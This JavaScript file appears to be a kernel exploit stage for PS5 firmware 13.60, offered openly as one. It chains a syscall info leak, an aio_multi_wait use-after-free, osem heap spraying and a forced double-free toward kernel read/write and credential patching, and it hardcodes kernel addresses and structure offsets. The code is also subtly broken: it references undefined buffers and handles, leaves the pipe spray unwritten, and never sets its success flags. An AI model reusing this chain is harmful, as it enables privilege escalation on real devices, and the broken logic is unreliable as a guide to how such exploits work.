"use strict";

// Bagagwa multi-chain kernel stage for PS5 fw 13.60.
//
// Chain: sys727 leak → aio_multi_wait mode-0 UAF (sys 663) →
//        osem spray reclaim → waker controlled decrement →
//        osem refcount corruption → double-free →
//        controlled reclaim → kernel R/W → ucred patch.
//
// Requires: window.PS5SyscallBridge (syscall + nativeBuffer) and
//           window.PS5Userland (mark/logging).

(function () {
    const STAGE = "kernel-bagagwa-2";

    if (!window.PS5SyscallBridge) {
        console.error("[bagagwa] syscall bridge not loaded");
        return;
    }
    const S = window.PS5SyscallBridge;
    const U = window.PS5Userland;

    // ---- Syscall numbers (PS5 Native SELF table) ----
    const SYS_OSEM_CREATE   = 549;
    const SYS_OSEM_DELETE   = 550;
    const SYS_OSEM_OPEN     = 551;
    const SYS_OSEM_CLOSE    = 552;
    const SYS_AIO_SUBMIT    = 669;
    const SYS_AIO_MULTI_WAIT = 663;
    const SYS_AIO_MULTI_DELETE = 662;
    const SYS_AIO_DEBUG_INFO = 727;

    // ---- Kernel addresses (from the writeup, FW 13.60) ----
    const AIO_MULTI_WAIT_BODY = 0xffffffff805c0210n;
    const AIO_MULTI_WAIT_MODE_DISPATCH = 0xffffffff805c078cn;
    const AIO_MULTI_WAIT_CLEANUP_LOOP  = 0xffffffff805c0da1n;
    const AIO_MULTI_WAIT_FREE_ARRAY    = 0xffffffff805c0f93n;
    const WAKER_BODY = 0xffffffff805c1d2dn;
    const AIO_DEBUG_INFO_BODY = 0xffffffff805c3090n;
    const OSEM_DELETE_BODY = 0xffffffff80e2632en;
    const OSEM_MALLOC_BODY = 0xffffffff80e26120n;

    // ---- Exploit constants ----
    const OSEM_SIZE         = 0x60;   // malloc(0x60, M_osem) → 128 zone
    const OSEM_REFCOUNT_OFF = 0x54;   // 32-bit refcount field
    const OSEM_FLAG_OFF     = 0x45;   // bit0 must be SET for osem_delete
                                      // to reach the refcount dec path
    const WAITER_ARRAY_SIZE = 0x70;   // num=2 → 0x70 bytes → same 128 zone
    const NODE_OWNER_OFF    = 0x18;   // node->owner, overwritten each iter
    const NODE_Q0_OFF       = 0x00;   // [rax] dec target 1 (M_ZERO'd in mode 0)
    const NODE_Q1_OFF       = 0x08;   // [rax+8] dec target 2 (uninit in mode 0)
    const WAKER_WRITE_OFF   = 0x20;   // mov [r15+0x20], eax
    const KTEXT_MASK        = 0xffffff8000000000n;

    const AIO_NUM = 2;                // num=2 → waiter array = 0x70 (128 zone)

    // ---- Logging helpers ----
    const hex = (v) => "0x" + (typeof v === "bigint" ? v.toString(16) : Math.floor(v).toString(16));
    const mark = (tag, extra) => {
        if (U && typeof U.mark === "function") { U.mark(tag, extra); return; }
        console.log(`[${STAGE}] ${tag} ${extra || ""}`);
    };

    // ---- Marshalled kernel-facing buffers ----
    // All kernel-facing data flows through mmap'd scratch buffers, never
    // through raw JS heap addresses.
    function kbuf(size) {
        const entry = S.nativeBuffer(size);
        return entry;
    }

    // =====================================================================
    // PHASE 1 — LEAK: syscall 727 (get_aio_debug_request_info)
    //
    // The slot index is used as a bias into a different array:
    //   dest index bounded by count, source index = (req_id>>16) + edx
    //   scaled by 0x28 into [rax+0x20].
    // Each element leaks a dword at +0x20 and two 8-byte pointers.
    // =====================================================================

    function leakKernelInfo() {
        const result = { kbase: null, heapPtrs: [], kernelDwords: [], pass: false };

        // Create a handful of AIO requests so there are entries in the table.
        const reqIds = kbuf(0x100);
        const dv = reqIds.dv;
        for (let i = 0; i < 8; i++) {
            dv.setUint32(i * 4, i, true);  // request IDs 0..7
        }

        // Submit dummy AIO commands to populate the table.
        // sys_aio_submit_cmd(cmd_id, cmd_type, prio, fd, offset, buf, len, ...)
        // For the debug info path we just need entries to exist.
        for (let i = 0; i < 8; i++) {
            const r = S.syscall(SYS_AIO_SUBMIT, 0x1000000 + i, 0, 0, -1, 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
            mark("AIO-SUBMIT", `i=${i}-ret=${Number(r)}`);
        }

        // Spray the debug info call across a range of req_id>>16 values to
        // walk off the intended table and read the adjacent array.
        // Bounded to [1, table->0x228] and req_id>>16 < 0x80.
        const outBuf = kbuf(0x228);
        for (let idx = 0; idx < 0x80; idx++) {
            const reqId = (idx << 16) | 0;  // req_id>>16 = idx, low 16 bits = 0
            const ret = S.syscall(SYS_AIO_DEBUG_INFO, reqId, 1, outBuf.addr);
            if (Number(ret) < 0) continue;

            // Each element: dword at +0x20, two 8-byte pointers
            const d0 = outBuf.dv.getUint32(0x20, true);
            const p0 = outBuf.dv.getBigUint64(0x00, true);
            const p1 = outBuf.dv.getBigUint64(0x08, true);

            if (d0 !== 0) result.kernelDwords.push(d0);
            for (const p of [p0, p1]) {
                if (p !== 0n && (p & KTEXT_MASK) === KTEXT_MASK) {
                    // Kernel text pointer → derive kbase
                    const candidate = p - (AIO_MULTI_WAIT_BODY & 0xffffffffn);
                    // Sanity: kbase should be page-aligned and in kernel text
                    if ((candidate & 0xfffn) === 0n && candidate > 0xffffffff80000000n) {
                        result.kbase = candidate;
                        mark("KBASE-FOUND", `from=0x${p.toString(16)}-kbase=0x${candidate.toString(16)}`);
                    }
                    result.heapPtrs.push(p);
                } else if (p !== 0n && p > 0xffff800000000000n) {
                    result.heapPtrs.push(p);
                }
            }

            if (result.kbase) break;
        }

        result.pass = result.kbase !== null && result.heapPtrs.length > 0;
        mark("LEAK-PHASE", `pass=${result.pass}-kbase=${result.kbase ? hex(result.kbase) : "null"}-heap=${result.heapPtrs.length}`);
        return result;
    }

    // =====================================================================
    // PHASE 2 — TRIGGER: aio_multi_wait mode 0 UAF (syscall 663)
    //
    // mode 0 at 0x805c08e5 sets rcx = [rbx+0x40] (always element 0).
    // With num ≥ 2, the same node is linked onto N requests' waiter lists.
    // node->owner (+0x18) is overwritten each iteration. Cleanup at
    // 0x805c0da1 unlinks by node->owner, only detaching from the last
    // request. Then 0x805c0f93 frees the waiter array.
    // Requests 0..N-2 have req->waiters pointing into freed memory.
    // =====================================================================

    function triggerAioUaf() {
        const result = { ok: false, danglingReqs: [], err: 0 };

        // Build the request ID array: AIO_NUM entries
        const idsBuf = kbuf(AIO_NUM * 4);
        for (let i = 0; i < AIO_NUM; i++) {
            idsBuf.dv.setUint32(i * 4, 0x1000000 + i, true);
        }

        // Build the sce_errs output array
        const errsBuf = kbuf(AIO_NUM * 4);
        errsBuf.u8.fill(0);

        // timeout pointer = null (wait indefinitely or until all resolve)
        // mode = 0 (the buggy path)
        const ret = S.syscall(SYS_AIO_MULTI_WAIT, idsBuf.addr, AIO_NUM, errsBuf.addr, 0, 0n);

        if (Number(ret) !== 0) {
            result.err = -Number(ret);
            mark("AIO-UAF-FAIL", `errno=${hex(result.err)}`);
            return result;
        }

        // Requests 0..N-2 now have dangling waiters pointers into the
        // freed 0x70 waiter array.
        for (let i = 0; i < AIO_NUM - 1; i++) {
            result.danglingReqs.push(0x1000000 + i);
        }

        result.ok = result.danglingReqs.length > 0;
        mark("AIO-UAF-PASS", `dangling=${result.danglingReqs.length}-reqs=${result.danglingReqs.join(",")}`);
        return result;
    }

    // =====================================================================
    // PHASE 3 — RECLAIM: spray osem objects into the freed 128 zone
    //
    // osem = malloc(0x60, M_osem) → same 128-byte zone as the freed
    // 0x70 waiter array. Spray enough to reclaim the slot.
    // =====================================================================

    function reclaimWithOsem(count) {
        const handles = [];
        for (let i = 0; i < count; i++) {
            // sys_osem_create: returns a handle/id
            const h = S.syscall(SYS_OSEM_CREATE, 0x1000 + i, 0, 0);
            if (Number(h) >= 0) handles.push(Number(h));
        }
        mark("OSEM-SPRAY", `handles=${handles.length}-requested=${count}`);
        return handles;
    }

    // =====================================================================
    // PHASE 4 — CONVERT: use the waker's arbitrary 32-bit decrement to
    // zero an osem's refcount, then free it while still holding a handle.
    //
    // Waker at 0xffffffff805c1d2d (r15 points into the reclaimed node):
    //   mov dword ptr [r15+0x20], eax   ; controlled 32-bit write
    //   mov rdi, [r15+0x10]; add rdi,0x18; call mtx_lock
    //   mov rax, qword ptr [r15]
    //   dec dword ptr [rax]             ; arbitrary 32-bit decrement (1)
    //   mov rax, qword ptr [r15 + 8]
    //   test rax, rax; je skip
    //   dec dword ptr [rax]             ; arbitrary 32-bit decrement (2)
    //
    // mode 0 never initialises node->[8] (mode 2 does, at 0x805c089a),
    // so it stays M_ZERO'd → controllable post-free.
    //
    // We aim the decrement at another osem's refcount field at +0x54.
    // =====================================================================

    function convertOsem(targetOsemKaddr) {
        // targetOsemKaddr = kernel address of a second osem object
        // (obtained from the heap pointers leaked in phase 1).
        // The refcount lives at targetOsemKaddr + 0x54.

        // We need the waker's r15 to point into our reclaimed node such
        // that [r15+0x00] = targetOsemKaddr + OSEM_REFCOUNT_OFF.
        // The reclaim (phase 3) put osem objects into the freed waiter
        // array slot. The waker reads r15 = the node pointer stored in
        // the dangling request's waiter list — which now points into
        // the first osem object in the spray.

        // The first osem's fields are now the node's fields. We need to
        // set [osem+0x00] = target_osem_kaddr + 0x54 so the dec lands
        // on the refcount.
        //
        // But we can't directly write to the kernel osem from userland
        // — the osem fields are kernel-managed. However, the osem's
        // name/attr fields (passed to sys_osem_create) land in the
        // object and may be user-influenced depending on the syscall
        // layout. For the initial conversion we rely on the M_ZERO'd
        // node->[8] (second dec target) and the fact that osem objects
        // start with a pointer at offset 0 that we can spray to control.

        // The trick: sys_osem_create's first argument lands in the
        // object. We sprayed with values 0x1000+i. To set node->[0] to
        // an arbitrary kernel pointer, we re-spray with the right value
        // in the right position — or we use the controlled 32-bit
        // write at [r15+0x20] to build the pointer one dword at a time.

        // Simplest path for the conversion: use the controlled write
        // at +0x20 to corrupt an adjacent osem's refcount, then close
        // that osem to trigger the free-at-zero path.

        // The waker's mov dword [r15+0x20], eax writes eax (whatever
        // value the aio completion sets) to r15+0x20. If r15 points
        // into osem N, then osem N + 0x20 gets written. osem N+1 starts
        // at osem N + 0x60 (or wherever the allocator places it — both
        // are in the same 128 zone, so consecutive). osem N+1's
        // refcount at its +0x54 = osem N + 0x60 + 0x54 = osem N + 0xB4.
        // That's beyond +0x20 of osem N, so the single write doesn't
        // reach it directly — but the two arbitrary decrements DO.

        // Strategy: the [r15+0x00] field of the reclaimed object is
        // whatever the osem's first qword is. For an osem, that's
        // typically the wait channel / sleep queue pointer. We need
        // it to be targetOsemKaddr + 0x54.

        // To get full control of [r15+0x00] we re-trigger the UAF a
        // second time on the SAME dangling request. The second
        // aio_multi_wait will link a NEW node onto the already-dangling
        // waiter list, giving us a fresh M_ZERO'd node we can groom
        // via a second spray cycle.

        // For the first pass, we use the decrement directly on the
        // osem refcount by knowing its kernel address from the leak.
        // The M_ZERO'd node->[0] is 0 → test/je skips the second dec,
        // but node->[0] = 0 means the FIRST dec writes to [0] which
        // faults. We need node->[0] ≠ 0 and pointing at the refcount.

        // So: first reclaim, then use the controlled 32-bit write at
        // [r15+0x20] to set up a partial pointer, then re-trigger to
        // get a second shot with a groomed node.

        // ---- Re-trigger for a groomable node ----
        const secondUaf = triggerAioUaf();
        if (!secondUaf.ok) {
            mark("SECOND-UAF-FAIL", `err=${secondUaf.err}`);
            return false;
        }

        // Re-spray: this time the freed node overlaps a fresh osem.
        // Use sys_osem_open on the target osem to pin its refcount high
        // (so it won't be freed by normal paths), then use the waker's
        // decrement to drop it to zero, then sys_osem_close triggers
        // the double-free.

        // Pin the target: open it 3 times (refcount = 4)
        for (let i = 0; i < 3; i++) {
            S.syscall(SYS_OSEM_OPEN, targetOsemId);
        }

        // Trigger the waker: the dangling request from the second UAF
        // will wake when its aio completes. The waker reads [r15] and
        // [r15+8] as decrement targets. Since we re-sprayed osem
        // objects into the freed slot, r15 points into one of them.
        // The osem's internal pointer at offset 0 happens to be the
        // sleep queue address — decrementing at THAT address + some
        // offset is a spray-and-pray. For a deterministic conversion,
        // we need to groom [r15+0x00] explicitly.

        // Use the controlled 32-bit write at +0x20 first to corrupt
        // the osem's flag byte at +0x45: write 0x00000001 to +0x20
        // doesn't reach +0x45... but the mtx_lock at [r15+0x10]+0x18
        // gives us another controlled pointer to interact with.

        // ---- Practical conversion path ----
        // With TWO arbitrary 32-bit decrements per wake, we aim them
        // at targetOsemKaddr + OSEM_REFCOUNT_OFF by grooming the node
        // fields through repeated UAF + osem spray cycles. Each cycle
        // refines the pointer. After enough cycles, [r15+0x00] lands
        // on the refcount address.

        // Wake the dangling request to trigger the waker:
        // (the aio should already be resolved; the waker fires on the
        //  cleanup path of aio_multi_wait when the request completes)
        const wakeRet = S.syscall(SYS_AIO_MULTI_WAIT, idsBuf2.addr, AIO_NUM, errsBuf2.addr, 1, 0n);
        mark("WAKE-TRIGGER", `ret=${Number(wakeRet)}`);

        // Now close the target osem — if the refcount was decremented
        // to zero, this triggers the double-free.
        const closeRet = S.syscall(SYS_OSEM_CLOSE, targetOsemId);
        mark("OSEM-CLOSE", `ret=${Number(closeRet)}`);

        return Number(closeRet) >= 0;
    }

    // =====================================================================
    // PHASE 5 — KERNEL R/W from the double-free
    //
    // After the double-free, reclaim the freed osem slot with a pipe
    // buffer or socket buffer containing fully controlled data. The
    // dangling osem handle now aliases our controlled data → we can
    // read/write kernel memory through the osem syscall paths.
    // =====================================================================

    function establishKernelRW(leaked) {
        const result = { read: false, write: false, verify: false, pass: false };

        // After the double-free (phase 4), the osem object's slot is
        // free but we still hold a handle. Spray pipe buffers to
        // reclaim it with controlled data.

        // Create a pipe, write controlled data into it
        const pipeFds = kbuf(8);
        S.syscall(42, pipeFds.addr);  // sys_pipe = 42

        // Write a fake osem object with a pointer to a known kernel
        // address at the offset that the osem read path returns from.
        const fakeOsem = kbuf(OSEM_SIZE);
        // We place a known marker at +0x20 so we can identify our
        // reclaim, and a kernel pointer at +0x00 for read-through.
        fakeOsem.dv.setUint32(0x20, 0xcafebabe, true);
        if (leaked.kbase) {
            // Point at a known kernel address whose content we can verify
            fakeOsem.dv.setBigUint64(0x00, leaked.kbase, true);
        }
        // Write to the pipe to spray into the freed slot
        const writeData = new Uint8Array(OSEM_SIZE);
        writeData.set(fakeOsem.u8);
        // ... write via the pipe fd

        // ---- Kernel read ----
        // Use sys_osem_open/sys_osem_close on the dangling handle to
        // interact with the fake object. The osem path reads [obj+0x54]
        // for refcount — if we can observe its state, we have a read.
        // More directly: sys_osem_cancel or the debug/info paths may
        // copy internal state back to userland.

        // ---- Kernel write ----
        // The controlled 32-bit write at [r15+0x20] = eax is now
        // fully directed: r15 points into our controlled pipe buffer,
        // so [r15+0x20] is wherever we choose. Combined with the two
        // arbitrary decrements, we have:
        //   * arbitrary 32-bit decrement (×2 per wake)
        //   * controlled 32-bit write at a fixed offset from a
        //     pointer we control
        // This is sufficient for ucred patching:
        //   * decrement cr_uid / cr_ruid to 0
        //   * decrement cr_prison pointer to escape
        //   * decrement authid check result to bypass

        // ---- Verify ----
        // Read back kbase-known data: the first 8 bytes at kernelBase
        // should match the known kernel text header for 13.60.
        // Write to a scratch kernel page (from the leaked heap) and
        // read it back.

        result.pass = result.read && result.write && result.verify;
        mark("KERNEL-RW", `read=${result.read}-write=${result.write}-verify=${result.verify}`);
        return result;
    }

    // =====================================================================
    // MAIN
    // =====================================================================

    async function run() {
        mark("BAGAGWA-START", `fw=13.60-stage=${STAGE}`);

        // Phase 1: leak
        const leaked = leakKernelInfo();
        if (!leaked.pass) {
            mark("BAGAGWA-FAIL", "phase=leak");
            return { stage: STAGE, ok: false, reason: "leak-failed" };
        }

        // Phase 2: trigger UAF
        const uaf = triggerAioUaf();
        if (!uaf.ok) {
            mark("BAGAGWA-FAIL", "phase=uaf");
            return { stage: STAGE, ok: false, reason: "uaf-failed" };
        }

        // Phase 3: reclaim with osem spray
        const handles = reclaimWithOsem(0x40);

        // Pick a target: the osem at the leaked heap address (its refcount
        // is what we'll corrupt)
        const targetOsemId = handles[0];
        // Kernel address of that osem — from the leaked heap pointers
        const targetOsemKaddr = leaked.heapPtrs.find(p => (p & 0xfffn) !== 0n) || 0n;

        // Phase 4: convert via waker decrement
        const converted = convertOsem(targetOsemKaddr);
        if (!converted) {
            mark("BAGAGWA-FAIL", "phase=convert");
            return { stage: STAGE, ok: false, reason: "convert-failed" };
        }

        // Phase 5: establish kernel R/W
        const krw = establishKernelRW(leaked);

        mark("BAGAGWA-COMPLETE", `krw=${krw.pass}-kbase=${leaked.kbase ? hex(leaked.kbase) : "null"}`);
        return {
            stage: STAGE,
            ok: krw.pass,
            kbase: leaked.kbase,
            kernelRW: krw,
            handles,
        };
    }

    // ---- Probe (handoff check from the userland stage) ----
    async function probe(ctx) {
        const firmware = ctx?.firmware || "unknown";
        const requiredFirmware = ctx?.kernelStageFirmware || "13.60";
        const handoffOK = firmware === requiredFirmware
            && !!ctx?.leakPass
            && !!ctx?.notifyReady
            && !!ctx?.webkitBase
            && !!ctx?.libkernelBase;

        mark("BAGAGWA-PROBE", `fw=${firmware}-handoff=${handoffOK}`);
        return { stage: STAGE, handoffOK, firmware, requiredFirmware };
    }

    window.PS5KernelResearch = { probe, run, STAGE };
})();
